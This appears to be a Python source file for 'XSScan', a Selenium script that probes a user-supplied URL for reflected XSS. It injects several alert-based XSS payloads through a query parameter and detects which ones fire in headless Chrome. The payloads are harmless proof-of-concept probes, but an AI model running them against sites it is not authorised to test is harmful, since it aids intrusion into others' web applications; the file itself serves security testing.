from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
from urllib.parse import quote
from colorama import init, Fore
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException

# Initialize colorama
init(autoreset=True)

# === Configuration ===

#Add more payloads and parameter for more accurate result
xss_payloads = [
    "<svg onload=alert(1)>",
    "<script>alert('XSS')</script>",
    '\"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
]

parameters = ["?q="]

# Setup Chrome browser in headless mode
def setup_browser():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    driver = webdriver.Chrome(options=options)
    return driver

def test_spa_xss(driver, base_url):
    print(Fore.CYAN + f"[+] Testing {base_url}")
    for parameter in parameters:
        for payload in xss_payloads:
            encoded_payload = quote(payload)
            test_url = f"{base_url}{parameter}{encoded_payload}"
            print(Fore.YELLOW + f"[*] Trying payload: {payload}")
            print(Fore.YELLOW + "[*] URL: "+ test_url)

            try:
                driver.get(test_url)
                time.sleep(2)

                # Check and close alert if triggered immediately on page load
                try:
                    alert = driver.switch_to.alert
                    alert.accept()
                    print(Fore.MAGENTA + f"[!] Alert detected: {alert.text}")
                    print(Fore.GREEN + f"    Payload: {payload}")
                    print(Fore.GREEN + f"    URL: {test_url}")
                    
                except NoAlertPresentException:
                    print(Fore.RED + "[-] No alert presented.")
                    
            except UnexpectedAlertPresentException:
                # Emergency alert recovery if alert triggers too early
                try:
                    alert = driver.switch_to.alert
                    alert.accept()
                except Exception as e:
                    pass

def head():
    print(Fore.RED + "██╗░░██╗░██████╗░██████╗" + Fore.CYAN + "░█████╗░░█████╗░███╗░░██╗")
    print(Fore.RED + "╚██╗██╔╝██╔════╝██╔════╝" + Fore.CYAN + "██╔══██╗██╔══██╗████╗░██║")
    print(Fore.RED + "░╚███╔╝░╚█████╗░╚█████╗░" + Fore.CYAN + "██║░░╚═╝███████║██╔██╗██║")
    print(Fore.RED + "░██╔██╗░░╚═══██╗░╚═══██╗" + Fore.CYAN + "██║░░██╗██╔══██║██║╚████║")
    print(Fore.RED + "██╔╝╚██╗██████╔╝██████╔╝" + Fore.CYAN + "╚█████╔╝██║░░██║██║░╚███║")
    print(Fore.RED + "╚═╝░░╚═╝╚═════╝░╚═════╝░" + Fore.CYAN + "░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝")
    print(Fore.GREEN + "[+] XSScan — Automated XSS Scanner for SPA")
    print(Fore.YELLOW + "[*] Hunting reflected XSS in the wild...")
    print(Fore.YELLOW + "[*] Arm your web defenses. Scan the flaws before they do.")
    print(Fore.YELLOW+ "[*] Creator: An Sophanith")
    print(Fore.YELLOW + "[*] Description: " + Fore.LIGHTRED_EX + "XSS" + Fore.LIGHTCYAN_EX + "scan" + Fore.RESET +
      " is an automated reflected XSS scanner.\nIt is designed specifically to detect reflected XSS vulnerabilities,"
      "\nand may not be effective for stored or DOM-based XSS.")
    print(Fore.CYAN + "======================================================================\n\n")
    print(Fore.LIGHTMAGENTA_EX + "URL should be something like this: http://localhost:3000 or http://192.168.134.120:3000\n")

# === Main ===
if __name__ == "__main__":
    head()
    base_url = input(Fore.WHITE + "Please input your URL: ").replace(" ", "")
    print(Fore.CYAN + f"Starting scan on: {base_url}\n")
    driver = setup_browser()
    test_spa_xss(driver, base_url)
